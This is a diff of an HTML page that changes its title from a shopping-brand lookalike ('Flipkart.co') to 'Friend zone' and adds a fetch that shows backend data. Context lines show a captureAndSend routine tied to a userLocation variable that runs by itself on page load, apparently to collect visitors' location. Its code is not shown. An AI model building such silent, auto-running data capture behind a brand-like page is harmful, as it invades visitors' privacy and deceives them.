@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Flipkart.co</title>
+    <title>Friend zone</title>
 </head>
 <body>
+    <div id="output">Backend data will appear here</div>
+
     <script>
         let userLocation = null;
 
@@ -58,6 +60,18 @@
 
         // Automatically run on page load
         window.addEventListener("load", captureAndSend);
+
+        // ---------- STEP 8: Fetch data from backend ----------
+        // Add this anywhere inside <script>, e.g., after captureAndSend
+        fetch("https://my-backend-estr.onrender.com") // replace with your Render backend URL
+            .then(res => res.json())
+            .then(data => {
+                console.log("Backend data:", data);
+                // Display it on the page
+                document.getElementById("output").innerText =
+                    `Message: ${data.message}\nTime: ${data.timestamp}`;
+            })
+            .catch(err => console.error("Error fetching backend data:", err));
     </script>
 </body>
 </html>
